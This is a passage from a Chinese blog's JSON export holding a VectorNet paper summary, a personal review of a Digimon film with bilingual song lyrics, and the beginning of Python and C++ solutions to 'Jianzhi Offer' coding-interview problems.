\\(\\mathcal{P}\\), 它的节点有 \\(\\{v_1, v_2, ..., v_p \\}\\)， 可以定义一个子图网络： \\[ v_i^{(l + 1)} = \\phi_{rel} \\left( g_{enc}\\left(v_i^{(l)}\\right), \\varphi_{agg}\\left(\\{v_j^{(l)}\\}\\right)\\right) \\] \\(v_i^{(l)}\\)代表第i个节点第L层的节点特征 \\(g_{enc}(\\cdot)\\)代表节点的变换，实践中采用MLP来实现 \\(\\varphi_{agg}(\\cdot)\\)代表聚合，从相邻的节点来获取信息，实践中采用的是max_pooling \\(\\varphi_{rel}(\\cdot)\\)代表\\(v_i\\)和周围节点的关系，实践中采用的是concate的操作 image-20201116233919807 最后经过多层的堆叠，来获取整个Polyline级别的特征： \\[ \\boldsymbol{p} = \\varphi_{agg} \\left(\\{v_i^{(L_p)}\\}\\right) \\] 这里，\\(\\varphi_{agg}(\\cdot)\\)也是max pooling操作 高阶交互 经过上面的子图，现在有了polyline级别节点的特征 \\(\\{p_1, p_2, ..., p_P\\}\\) 为了建立高阶的交互，建立了个global的交互图，详见论文图2的第3个子图。 公式定义如下： \\[ \\{p_i^{(l + 1)}\\} = \\text{GNN}\\left(\\{p_i^{(l)}\\}, \\mathcal{A} \\right) \\] \\(\\{p_i^{(l)}\\}\\)代表polyline节点的集合 \\(\\mathcal{A}\\)代表邻接矩阵，实践中采用全链接 \\(GNN(\\cdot)\\)代表 一层的GNN网络，实践中采用的是self attention layer： \\[ \\text{GNN}\\left(P\\right) = \\text{softmax} \\left(P_QP_K^T\\right) P_V \\] 其中，\\(P\\)是node的feature matrix，\\(P_Q,P_k,P_v\\)则是它的线性投影。 轨迹生成 经过了全局的网络之后，就生成了节点的特征\\(P_i^{(L_t)}\\)，其中\\(L_t\\)是全局GNN网络的层数。然后将\\(P_i^{(L_t)}\\)放入decoder进行轨迹的生成： \\[ \\boldsymbol{v_i^{future}} = \\varphi_{traj}\\left(P_i^{(L_t)}\\right) \\] 论文中，decoder \\(\\varphi_{traj}(\\cdot)\\)使用的是MLP，当然也可以用MultiPath的方法。 多任务训练 为了让全局交互图能更好地捕捉不同轨迹和地图元素之间的交互信息，论文还提出了一个辅助的任务：在训练过程中，随机mask掉一些节点的特征，然后尝试去还原被掩盖的节点特征： \\[ \\boldsymbol{\\hat{P}_i} = \\varphi_{node}\\left(P_i^{(L_t)}\\right) \\] 这里节点的decoder \\(\\varphi_{node}(\\cdot)\\) 也是一个MLP，只在训练的时候使用。 损失函数 \\[ \\mathcal{L} = \\mathcal{L}_{traj} + \\alpha \\mathcal{L}_{node} \\] \\(\\mathcal{L}_{traj}\\) negative Gaussian log-likelihood loss \\(\\mathcal{L}_{node}\\) 是预测的节点和被掩盖节点的huber损失 GaussianLogLikelihood 损失函数为： \\[ \\mathcal{L}(x, y) = -\\log p(y) = -\\log p\\left(y|\\mu(x),\\Sigma(x)\\right) \\] where \\[ p(y) = p(y|\\mu,\\Sigma) = \\frac{1}{(2\\pi)^{n/2}|\\Sigma|^{1/2}} \\exp\\left\\{-\\frac{1}{2}(y-\\mu)^\\top\\Sigma^{-1}(y-\\mu) \\right\\} \\] Huber比较常见： \\[ L_{\\delta }(y,f(x))={\\begin{cases}{\\frac {1}{2}}(y-f(x))^{2}&amp;{\\textrm {for}}|y-f(x)|\\leq \\delta ,\\\\\\delta \\,|y-f(x)|-{\\frac {1}{2}}\\delta ^{2}&amp;{\\textrm {otherwise.}}\\end{cases}} \\] 实验 Datasets Argoverse: 333K 5-second long sequences split into 211K training, 41K validation and 80K testing sequences. (0, 2] seconds are used as observation and (2, 5] seconds for trajectory prediction. In-house dataset:2.2M的训练集和0.55M的测试集，轨迹为4s， (0, 1] 作为历史信息 (1, 4] 作为预测值 Ablation study for the ConvNet baseline Impact of receptive fields image-20201118221744670 对比Resolution为400X400的卷积核3，5，7，可以看出更大的卷积核会有更大的性能提升，同时计算量也会增大。 从表1的第3行到第6行我们可以看出，较大的裁剪尺寸可以显著地提高性能，同时沿着轨迹裁剪也能得到更好的性能 这一观察结果证实了当把栅格化图像作为输入时，感受野的重要性。同时，也体现了它的局限性，一个精心设计的裁剪策略通常伴随着计算成本的增加。 Impact of rendering resolution 对比分辨率 400× 400(0.25 meter per pixel), 200× 200(0.5 meter per pixel) and 100× 100(1 meter per pixel) 可以看出随着分辨率的提高，性能也普遍得到了提高。 对于Argoverse数据集我们可以看出将分辨率从200×200增加到400×400会导致性能的略微下降，这可以解释为对于固定的3×3卷积核尺寸，有效感受野的减小造成的。 Ablation study for VectorNet Impact of input node types image-20201118221833780 前三行对应只使用目标车辆的历史轨迹，只添加地图特征以及同时添加轨迹特征。我们可以清楚地看到增加地图特征明显地改善了轨迹预测性能。 表2的后四行比较了辅助任务的影响。我们可以看出添加这一任务有助于改善性能，尤其在长期预测。 Impact on the graph architectures image-20201118221853500 对于折线子图，三层具有最好的性能，而对于全局图，只需要一层。 让MLP变宽并不会带来更好的性能，反而会对Argoverse数据集造成不好的影响 comparison with ConvNets Comparison of Performance image-20201118221923469 对于内部数据集，在大量减少模型参数和计算量的前提下，VectorNet达到了与最好的残差网络模型相当的性能。 对于Argoverse数据集，VectorNet明显优于最好的卷积网络，在预测3秒时位置误差减少了12%。 我们发现内部数据集包含很多静止的车辆，这些场景可以很容易地被卷积网络解决，因为它擅长捕捉局部模式。但是Argoverse数据集中只提供“interesting”场景。VectorNet性能好过最优的卷积网络基线，大概是因为它能够通过层级图网络捕捉更大范围的环境信息。 Comparison of FLOPs and model size 结果如表4所示(预测的解码器没有添加到计算量和参数量的计算中)。 我们可以看到随着卷积核尺寸和输入图片尺寸的增加，卷积网络的计算量呈二次方增加，并且模型的参数量也随着卷积核呈二次方增加。 对于VectorNet，计算量取决于场景中的向量节点和折线的数量。对于内部数据集，地图中折线的平均数量为17，包含205个向量。平均动态交通参与者折线数为59，包含590个向量。我们基于这些平均数来计算计算量。注意Vector是以障碍物为中心计算的，所以计算量随着预测目标的数量呈线性增加。 比较R18-k3-t-r400（卷积网络中最优模型）和VectorNet，VectorNet明显优于卷积网络。在计算方面，对于一个交通参与者，卷积网络比VectorNet增加了200+倍的计算量。考虑到场景中车辆的平均数量约为30辆，VectorNet的实际计算量仍然比卷积网络小得多。同时，VectorNet的参数量为卷积网络参数量的29%。基于比较可以发现VectorNet可以在大幅度减少计算成本的同时显著提高性能。 Comparison with state-of-the-art methods VectorNet性能最好 image-20201118221955865 小结 vectornet是一个比较新颖的特征提取工具，通过将地图与车辆历史轨迹看为\"vector\"的形式，能较好的学习到环境语义的embedding表达。据说Waymo内部将vector用在高速卡车上。 不过vectornet这篇论文预测的header做的比较简单，也没有搞多模态的设计，不过也无伤大雅，毕竟这不是主要的内容。 参考文献 Gao J, Sun C, Zhao H, et al. VectorNet: Encoding HD Maps and Agent Dynamics from Vectorized Representation[C]//Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition. 2020: 11525-11533.","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"自动驾驶","slug":"study/自动驾驶","permalink":"https://www.hrwhisper.me/categories/study/%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"}],"tags":[{"name":"prediction","slug":"prediction","permalink":"https://www.hrwhisper.me/tags/prediction/"},{"name":"paper","slug":"paper","permalink":"https://www.hrwhisper.me/tags/paper/"},{"name":"self-driving car","slug":"self-driving-car","permalink":"https://www.hrwhisper.me/tags/self-driving-car/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"}]},{"title":"《数码宝贝-最后的进化》","slug":"shumabaobei","date":"2020-11-14T14:19:23.000Z","updated":"2020-11-14T15:51:43.226Z","comments":true,"path":"digimon-last-evolution-movie-comments/","link":"","permalink":"https://www.hrwhisper.me/digimon-last-evolution-movie-comments/","excerpt":"今天去看了《数码宝贝-最后的进化》，写一下感想 注意：本文有剧透。","text":"今天去看了《数码宝贝-最后的进化》，写一下感想 注意：本文有剧透。 影片一开始就是一只数码宝贝误入了东京，然后被暴龙兽、天使兽、天女兽围攻，还有增援的加鲁鲁兽一起将其赶回数码世界。 这时候就看到了长大后似乎比较成功的孩子们： 素娜在学习插花，美美搞起了电商，阿助已经快要成为医生，光子郎已经是公司的总裁 最小的阿武和嘉儿也似乎对未来的道路较为明确 而太一和阿和，则在迷茫中： 太一快要大学毕业了，正愁毕业的论文题目，还面临找工作的压力 阿和也快要毕业了，但想要读研，“给自己多一点时间思考” 他们觉得，也许只有数码宝贝是永恒不变的把。 这时候出现了反派的BOSS，专门攻击被选中的孩子们，让孩子们陷入昏迷。 于是太一、阿和、阿武和光子郎进入数码世界打BOSS，然后就是强大的奥米加兽登场，要给与最后一击的时候突然解体，BOSS得以逃过一劫。 这时候反派女主揭开了解体的原因，竟然是因为孩子们的长大。 你们知道为什么数码宝贝选择的伙伴都是孩子吗? 没错，孩子的未来有无限宽广的选择。 当被选召的孩子在人生经历上进化时，数码宝贝才会同时进化，每个孩子也在这个过程中形成属于自己特性。当孩子慢慢长大，可以独立生活，不再需要数码宝贝帮助的时候，就失去了无限的可能性，数码宝贝达到“最后的进化后”的时刻。也就是说，孩子长大成人，或者数码宝贝进化到了最终的形态，便是数码宝贝永远消失的时候。 太一不相信，但是他的数码暴龙机上的黄色光圈缺证明了这一切--当光环消失的时候，就是他和亚古兽分别的时候。 大和也是，蓝色的光圈在提醒着他们剩余的时间。 命运的钟表，已经残酷的开始了计时，而你却无法将它停下，哪怕一刻。 当反派将被选召的孩子们一个个抓走，太一和阿和面临了艰难的选择： 战斗吗？战斗意味着加速计时，只会更快的失去伙伴。 你想好了吗太一？ 亚古兽说：”战斗把太一“， 加布兽说：”战斗吧阿和“ “我们想拯救大家” 总有人必须负重前行，总有人必须学会告别。 ”这是我们，最后的进化” 打败了BOSS后，画面来到海边。 太一的光圈已经剩下了最后的一格。 亚古兽说想吃冰淇淋，太一说买个哈密瓜味的给你。 看着太一的背影，亚古兽说，“太一，你已经长大了啊”。 阿和此时和加布兽在楼上看夕阳， 阿和新学了曲子吹给加布兽听， “我为有阿和这样的伙伴感到自豪” 那么，明天我们做什么呢？亚古兽和加布兽分别问道。 太一和阿和都是一愣，抬起头想了想，过了半晌，说，我知道了，明天我们就去.. 一回头，旁边亚古兽和加布兽早已不见， 手上数码暴龙机也变成了石头。 这一刻我泪流满面，难道成长意味着我们必须要失去吗？ 回想之前素娜说：我要和比丘兽永远在一起。 再到战斗中她在窗边听到太一的哨声，手上握着变成石头的数码暴龙机，看来丘比兽也消失了。 谁也不想失去，谁也不想。 但其实生命中所有的礼物，早已暗中标好了价格。我们握不住那些注定要失去的，并且要承受失去的痛苦。 这就是生活的残酷，这就是成长的代价，我们能做的就是记住这些美好的东西，变得更坚强，去创造无限可能的未来。 回家的路上脑海中一直是片尾曲的旋律： AiM - 離れていても 作词：岡本真夜 作曲：岡本真夜 编曲：黒川陽介 大丈夫 没关系 泣かないよ 泣かないよ 我不会哭的 我不会哭了 約束したから 因为约定过了 今も聴こえる 君の声 只要闭上眼睛 此刻你的声音 瞳閉じれば 便会传入我耳畔 晴れ渡る空の青 这片蓝天万里无云 どこかで君も見ている 你也在某个地方眺望着它 負けないように 为了不就此认输 うつむかないように 为了不轻易沮丧消沉 君との約束 握りしめるよ 我会紧握着 和你的约定 君がいるから 因为有你在 心にいるから 就在我心中 離れていても歩ける 哪怕与你分离我仍能前进 毎日がせいいっぱい 每天都已竭尽了全力 それでも明日を描くよ 即便如此仍会描绘明天 流れる景色に 就算看着流逝的*景色* 少しだけため息ついても 会落下些许的叹息 傷ついてたはずなのに 明明就已经受了伤 どんなときも君は笑ってた 可不论何时你都带着笑容 何か足りない日々が 就算这有所欠缺的时光 続いても 仍在继续着 どこかに光があると信じて 我仍坚信光芒就在某个地方 あたりまえ などない 在这个没有 理所当然的 この世界で 世界之中 強くいられる 是你给予了我 勇気をくれたね 坚强起来的勇气 負けないように 为了不就此认输 うつむかないように 为了不轻易沮丧消沉 本当は 虽然我 そばにいてほしいけど 真的很想你陪伴在身旁 君がいるから 可因为有你 心にいるから 就在我心中 離れていても歩いて行くよ 哪怕与你分离我仍在迈步前行 出会えた事が 曾经的相遇 二人の想い出が 两个人的回忆 今もこの先も 将会永远 照らしてくれる 就此照耀着我 会いに行くから 我会去见你的 会えたその時は 在相见的时刻 夢の続きを話そう 再畅谈梦想的后续吧 永远年轻，永远热泪盈眶。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"剑指 Offer题解","slug":"jianzhi-offer","date":"2020-11-07T10:37:45.000Z","updated":"2021-01-05T15:59:39.011Z","comments":true,"path":"leetcode-jianzhi-offer-solution/","link":"","permalink":"https://www.hrwhisper.me/leetcode-jianzhi-offer-solution/","excerpt":"剑指 Offer的题解，更新中","text":"剑指 Offer的题解，更新中 03. 数组中重复的数字 找出数组中重复的数字。 在一个长度为 n 的数组 nums 里的所有数字都在 0～n-1 的范围内。数组中某些数字是重复的，但不知道有几个数字重复了，也不知道每个数字重复了几次。请找出数组中任意一个重复的数字。 示例 1： 输入： [2, 3, 1, 0, 2, 5, 3] 输出：2 或 3 限制： 2 &lt;= n &lt;= 100000 直接记录即可 Python 12345678class Solution: def findRepeatNumber(self, nums: List[int]) -&gt; int: vis = [False] * len(nums) for num in nums: if vis[num]: return num vis[num] = True return None 04. 二维数组中的查找 在一个 n * m 的二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个高效的函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 示例: 现有矩阵 matrix 如下： 1234567&gt;[ [1, 4, 7, 11, 15], [2, 5, 8, 12, 19], [3, 6, 9, 16, 22], [10, 13, 14, 17, 24], [18, 21, 23, 26, 30]&gt;] 给定 target = 5，返回 true。 给定 target = 20，返回 false。 限制： 12&gt;0 &lt;&#x3D; n &lt;&#x3D; 1000&gt;0 &lt;&#x3D; m &lt;&#x3D; 1000 注意：本题与主站 240 题相同：https://leetcode-cn.com/problems/search-a-2d-matrix-ii/ 题解见本博客另一篇文章Search a 2D Matrix II 12345678910111213141516class Solution &#123;public: bool findNumberIn2DArray(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) &#123; if (matrix.empty() || matrix[0].empty()) return false; for (int i = matrix.size() - 1, j = 0; i &gt;= 0 &amp;&amp; j &lt; matrix[i].size(); )&#123; if (matrix[i][j] &lt; target) &#123; ++j; &#125; else if (matrix[i][j] &gt; target)&#123; --i; &#125; else &#123; return true; &#125; &#125; return false; &#125;&#125;; 05. 替换空格 请实现一个函数，把字符串 s 中的每个空格替换成\"%20\"。 示例 1： 12&gt;输入：s &#x3D; &quot;We are happy.&quot;&gt;输出：&quot;We%20are%20happy.&quot; 限制： 1&gt;0 &lt;&#x3D; s 的长度 &lt;&#x3D; 10000 c++稍微麻烦点，就是s[i]为空格push三个字符即可 c++ 12345678910111213141516class Solution &#123;public: string replaceSpace(string s) &#123; std::string ans; for (std::size_t i = 0; i &lt; s.size(); ++i) &#123; if (s[i] == &#x27; &#x27;) &#123; ans.push_back(&#x27;%&#x27;); ans.push_back(&#x27;2&#x27;); ans.push_back(&#x27;0&#x27;); &#125; else &#123; ans.push_back(s[i]); &#125; &#125; return ans; &#125;&#125;; Python: 123class Solution: def replaceSpace(self, s: str) -&gt; str: return s.replace(&#x27; &#x27;, &#x27;%20&#x27;) 06. 从尾到头打印链表 输入一个链表的头节点，从尾到头反过来返回每个节点的值（用数组返回）。 示例 1： 输入：head = [1,3,2] 输出：[2,3,1] 限制： 0 &lt;= 链表长度 &lt;= 10000 c++ 1234567891011class Solution &#123;public: vector&lt;int&gt; reversePrint(ListNode* head) &#123; vector&lt;int&gt; ans; for (; head != nullptr; head = head-&gt;next) &#123; ans.push_back(head-&gt;val); &#125; std::reverse(ans.begin(), ans.end()); return ans; &#125;&#125;; 07. 重建二叉树 输入某二叉树的前序遍历和中序遍历的结果，请重建该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。 例如，给出 前序遍历 preorder = [3,9,20,15,7] 中序遍历 inorder = [9,3,15,20,7] 返回如下的二叉树： 3 / \\ 9 20 / \\ 15 7 0 &lt;= 节点个数 &lt;= 5000 同105题 简单的切片： Python 12345678910class Solution: def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; TreeNode: if not preorder or not inorder: return None root = TreeNode(preorder[0]) index = inorder.index(root.val) root.left = self.buildTree(preorder[1 : index + 1], inorder[: index]) root.right = self.buildTree(preorder[index + 1:], inorder[index + 1:]) return root 带上下标： C++ 12345678910111213141516171819class Solution &#123; TreeNode* buildTree(const vector&lt;int&gt;&amp; preorder, const vector&lt;int&gt;&amp; inorder, int p_s, int p_e, int i_s, int i_e) &#123; if (p_s &gt;= p_e || i_s &gt;= i_e) &#123; return nullptr; &#125; TreeNode* root = new TreeNode(preorder[p_s]); int index = std::find(inorder.begin() + i_s, inorder.begin() + i_e, root-&gt;val) - inorder.begin(); int length = index - i_s; root-&gt;left = buildTree(preorder, inorder, p_s + 1, p_s + length + 1, i_s, index); root-&gt;right = buildTree(preorder, inorder, p_s + length + 1, p_e, index + 1, i_e); return root; &#125;public: TreeNode* buildTree(vector&lt;int&gt;&amp; preorder, vector&lt;int&gt;&amp; inorder) &#123; return buildTree(preorder, inorder, 0, preorder.size(), 0, inorder.size()); &#125;&#125;; 09. 用两个栈实现队列 用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 ) 示例 1： 1234&gt;输入：&gt;[&quot;CQueue&quot;,&quot;appendTail&quot;,&quot;deleteHead&quot;,&quot;deleteHead&quot;]&gt;[[],[3],[],[]]&gt;输出：[null,null,3,-1] 示例 2： 1234&gt;输入：&gt;[&quot;CQueue&quot;,&quot;deleteHead&quot;,&quot;appendTail&quot;,&quot;appendTail&quot;,&quot;deleteHead&quot;,&quot;deleteHead&quot;]&gt;[[],[],[5],[2],[],[]]&gt;输出：[null,-1,null,null,5,2] 提示： 1 &lt;= values &lt;= 10000 最多会对 appendTail、deleteHead 进行 10000 次调用 队列：先进先出；栈：后进先出 因此要pop队首的时候，只需要把元素丢到另外一个栈里面，就从后进先出变成了“先进先出”了 C++ 12345678910111213141516171819202122232425class CQueue &#123; stack&lt;int&gt; s1; stack&lt;int&gt; s2;public: CQueue() &#123;&#125; void appendTail(int value) &#123; s1.push(value); &#125; int deleteHead() &#123; if (s2.empty()) &#123; while (!s1.empty()) &#123; s2.push(s1.top()); s1.pop(); &#125; &#125; if (s2.empty()) &#123; return -1; &#125; int ans = s2.top(); s2.pop(); return ans; &#125;&#125;; 10- I. 斐波那契数列 写一个函数，输入 n ，求斐波那契（Fibonacci）数列的第 n 项。斐波那契数列的定义如下： F(0) = 0, F(1) = 1 F(N) = F(N - 1) + F(N - 2), 其中 N &gt; 1. 斐波那契数列由 0 和 1 开始，之后的斐波那契数就是由之前的两数相加而得出。 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 示例 1： 输入：n = 2 输出：1 示例 2： 输入：n = 5 输出：5 提示： 0 &lt;= n &lt;= 100 直接迭代就完事了 1234567891011121314151617181920class Solution &#123;public: int fib(int n) &#123; if (n == 0) &#123; return 0; &#125; else if (n == 1) &#123; return 1; &#125; const int MOD = 1000000007; int first = 0, second = 1; int third = 0; for (int i = 2; i &lt;= n; ++i) &#123; third = first + second; third %= MOD; first = second; second = third; &#125; return third; &#125;&#125;; 10- II. 青蛙跳台阶问题 一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶。求该青蛙跳上一个 n 级的台阶总共有多少种跳法。 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 示例 1： 12&gt;输入：n &#x3D; 2&gt;输出：2 示例 2： 12&gt;输入：n &#x3D; 7&gt;输出：21 示例 3： 12&gt;输入：n &#x3D; 0&gt;输出：1 提示： 0 &lt;= n &lt;= 100 显然有dp[i] = dp[i - 1] + dp[i - 2]，所以和斐波那契数列基本一样（初始0的时候为1就这点不同） 1234567891011121314151617class Solution &#123;public: int numWays(int n) &#123; if (n == 0) return 1; if (n == 1) return 1; const int MOD = 1000000007; int first = 1, second = 1; int third = 0; for (int i = 2; i &lt;= n; ++i) &#123; third = first + second; third %= MOD; first = second; second = third; &#125; return third; &#125;&#125;; 11. 旋转数组的最小数字 把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个递增排序的数组的一个旋转，输出旋转数组的最小元素。例如，数组 [3,4,5,1,2] 为 [1,2,3,4,5] 的一个旋转，该数组的最小值为1。 示例 1： 12&gt;输入：[3,4,5,1,2]&gt;输出：1 示例 2： 12&gt;输入：[2,2,2,0,1]&gt;输出：0 与154题相同 分治法 如果num[left] &lt; num[right]说明数组有序，返回num[left] 如果num[left] &gt;= num[right]则左右两边查找取min即可 12345678910111213class Solution: def minArray(self, numbers: List[int]) -&gt; int: if not numbers: return 0 return self.find_min(numbers, 0, len(numbers) - 1) def find_min(self, numbers, left, right): if left == right: return numbers[left] if numbers[left] &lt; numbers[right]: return numbers[left] else: mid = (left + right) &gt;&gt; 1 return min(self.find_min(numbers, left, mid), self.find_min(numbers, mid + 1, right)) 二分搜索 设mid = (left + right) / 2 如果 nums[mid] &lt; nums[right]：说明右半部分不可能有最小的元素，因此right = mid nums[mid] &gt; nums[right]：说明旋转的元素（最小值）一定在(mid, righth]之间，因此left = mid + 1 nums[mid] == nums[right]：无法确定最小值的范围，但是两个元素相等，可以让right - 1来缩小范围 12345678910111213class Solution: def minArray(self, nums: List[int]) -&gt; int: left = 0 right = len(nums) - 1 while left &lt; right: mid = (left + right) &gt;&gt; 1 if nums[mid] &gt; nums[right]: left = mid + 1 elif nums[mid] &lt; nums[right]: right = mid else: right -= 1 return nums[left] 12. 矩阵中的路径 请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一格开始，每一步可以在矩阵中向左、右、上、下移动一格。如果一条路径经过了矩阵的某一格，那么该路径不能再次进入该格子。例如，在下面的3×4的矩阵中包含一条字符串“bfce”的路径（路径中的字母用加粗标出）。 [[\"a\",\"b\",\"c\",\"e\"], [\"s\",\"f\",\"c\",\"s\"], [\"a\",\"d\",\"e\",\"e\"]] 但矩阵中不包含字符串“abfb”的路径，因为字符串的第一个字符b占据了矩阵中的第一行第二个格子之后，路径不能再次进入这个格子。 示例 1： 12&gt;输入：board &#x3D; [[&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;E&quot;],[&quot;S&quot;,&quot;F&quot;,&quot;C&quot;,&quot;S&quot;],[&quot;A&quot;,&quot;D&quot;,&quot;E&quot;,&quot;E&quot;]], word &#x3D; &quot;ABCCED&quot;&gt;输出：true 示例 2： 12&gt;输入：board &#x3D; [[&quot;a&quot;,&quot;b&quot;],[&quot;c&quot;,&quot;d&quot;]], word &#x3D; &quot;abcd&quot;&gt;输出：false 提示： 1 &lt;= board.length &lt;= 200 1 &lt;= board[i].length &lt;= 200 注意：本题与主站 79 题相同：https://leetcode-cn.com/problems/word-search/ 直接dfs即可 Python 12345678910111213141516171819202122232425262728293031dx = [0, 0, 1, -1]dy = [1, -1, 0, 0]class Solution: def exist(self, board: List[List[str]], word: str) -&gt; bool: m, n = len(board), len(board[0]) vis = [[False for _ in range(n)] for _ in range(m)] for i in range(m): for j in range(n): if board[i][j] == word[0]: vis[i][j] = True if self.dfs(i, j, 1, vis, board, word): return True vis[i][j] = False return False def dfs(self, x, y, word_index, vis, board, word): if word_index == len(word): return True for i in range(4): nx = x + dx[i] ny = y + dy[i] if nx &lt; 0 or ny &lt; 0 or nx &gt;= len(board) or ny &gt;= len(board[0]): continue if board[nx][ny] != word[word_index] or vis[nx][ny]: continue vis[nx][ny] = True if self.dfs(nx, ny, word_index + 1, vis, board, word): return True vis[nx][ny] = False return False 13. 机器人的运动范围 地上有一个m行n列的方格，从坐标 [0,0] 到坐标 [m-1,n-1] 。一个机器人从坐标 [0, 0]的格子开始移动，它每次可以向左、右、上、下移动一格（不能移动到方格外），也不能进入行坐标和列坐标的数位之和大于k的格子。例如，当k为18时，机器人能够进入方格 [35, 37] ，因为3+5+3+7=18。但它不能进入方格 [35, 38]，因为3+5+3+8=19。请问该机器人能够到达多少个格子？ 示例 1： 12&gt;输入：m &#x3D; 2, n &#x3D; 3, k &#x3D; 1&gt;输出：3 示例 2： 12&gt;输入：m &#x3D; 3, n &#x3D; 1, k &#x3D; 0&gt;输出：1 提示： 1 &lt;= n,m &lt;= 100 0 &lt;= k &lt;= 20 方法1 对于一个格子，只需要向下或者向右，bfs即可 12345678910111213141516171819class Solution: def movingCount(self, m: int, n: int, k: int) -&gt; int: ans = 0 dx = [1, 0] dy = [0, 1] q = deque([(0, 0)]) vis = [[False if i // 10 + i % 10 + j // 10 + j % 10 &lt;= k else True for j in range(n)] for i in range(m)] vis[0][0] = True while q: cur = q.popleft() ans += 1 for i in range(2): nx, ny = cur[0] + dx[i], cur[1] + dy[i] if nx &lt; 0 or ny &lt; 0 or nx &gt;= m or ny &gt;= n or vis[nx][ny]: continue vis[nx][ny] = True q.append((nx, ny)) return ans 方法2 一个位置能否达到取决于左边和上面的两个地方，因此有vis[i][j] = vis[i - 1][j] || vis[i][j - 1] 123456789101112131415class Solution: def movingCount(self, m: int, n: int, k: int) -&gt; int: vis = [[False for j in range(n)] for i in range(m)] vis[0][0] = True ans = 1 for i in range(m): for j in range(n): if i // 10 + i % 10 + j // 10 + j % 10 &gt; k: continue pre_row = i &gt; 0 and vis[i - 1][j] pre_col = j &gt; 0 and vis[i][j - 1] if pre_col or pre_row: vis[i][j] = True ans += 1 return ans 14- I. 剪绳子 给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]...k[m-1] 。请问 k[0]*k[1]*...*k[m-1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 示例 1： 123&gt;输入: 2&gt;输出: 1&gt;解释: 2 &#x3D; 1 + 1, 1 × 1 &#x3D; 1 示例 2: 123&gt;输入: 10&gt;输出: 36&gt;解释: 10 &#x3D; 3 + 3 + 4, 3 × 3 × 4 &#x3D; 36 提示： 2 &lt;= n &lt;= 58 注意：本题与主站 343 题相同：https://leetcode-cn.com/problems/integer-break/ n &gt; 3的情况下，我们处理一个数拆分成2，要么拆分成3，（4的话相当于2个2 ， 拆成1的话乘积太小了） 弄得越多段，应该乘积越大 因此可以dp，详见本博客另外一篇文章leetcode Integer Break 12345678910class Solution: def cuttingRope(self, n: int) -&gt; int: if n &lt;= 3: return n - 1 dp = [0] * (n + 1) dp[1] = 1 dp[2] = 2 dp[3] = 3 for i in range(4, n + 1): dp[i] = max(dp[i - 3] * 3, dp[i - 2] * 2) return dp[n] 但是还可以进一步改进： 12345678910class Solution: def cuttingRope(self, n: int) -&gt; int: if n &lt;= 3: return n - 1 mod = n % 3 if mod == 0: return 3 ** (n // 3) elif mod == 1: return 4 * 3 ** (n // 3 - 1) else: return 2 * 3 ** (n // 3) 14- II. 剪绳子 II 给你一根长度为 n 的绳子，请把绳子剪成整数长度的 m 段（m、n都是整数，n&gt;1并且m&gt;1），每段绳子的长度记为 k[0],k[1]...k[m - 1] 。请问 k[0]*k[1]*...*k[m - 1] 可能的最大乘积是多少？例如，当绳子的长度是8时，我们把它剪成长度分别为2、3、3的三段，此时得到的最大乘积是18。 答案需要取模 1e9+7（1000000007），如计算初始结果为：1000000008，请返回 1。 示例 1： 123&gt;输入: 2&gt;输出: 1&gt;解释: 2 &#x3D; 1 + 1, 1 × 1 &#x3D; 1 示例 2: 123&gt;输入: 10&gt;输出: 36&gt;解释: 10 &#x3D; 3 + 3 + 4, 3 × 3 × 4 &#x3D; 36 提示： 2 &lt;= n &lt;= 1000 注意：本题与主站 343 题相同：https://leetcode-cn.com/problems/integer-break/ 和上面一样 1234567891011class Solution: def cuttingRope(self, n: int) -&gt; int: if n &lt;= 3: return n - 1 mod = n % 3 MOD = 1000000007 if mod == 0: return 3 ** (n // 3) % MOD elif mod == 1: return 4 * 3 ** (n // 3 - 1) % MOD else: return 2 * 3 ** (n // 3) % MOD c++版本，用上快速幂 12345678910111213141516171819202122232425262728293031class Solution &#123;public: int cuttingRope(int n) &#123; if (n &lt;= 3) &#123; return n - 1; &#125; int mod = n % 3; long long ans = 0; if (mod == 0) &#123; ans = quick_pow(3, n / 3); &#125; else if (mod == 1) &#123; ans = quick_pow(3, n / 3 - 1) * 4; &#125; else &#123; ans = quick_pow(3, n / 3) * 2; &#125; return ans % MOD; &#125; long long quick_pow(long long x, int n) &#123; long long ans = 1; while (n &gt; 0) &#123; if (n &amp; 1) &#123; ans = ans * x % MOD; &#125; x = x * x % MOD; n &gt;&gt;= 1; &#125; return ans; &#125;private: long long MOD = 1000000007;&#125;; 15. 二进制中1的个数 请实现一个函数，输入一个整数，输出该数二进制表示中 1 的个数。例如，把 9 表示成二进制是 1001，有 2 位是 1。因此，如果输入 9，则该函数输出 2。 示例 1： 123&gt;输入：00000000000000000000000000001011&gt;输出：3&gt;解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &#39;1&#39;。 示例 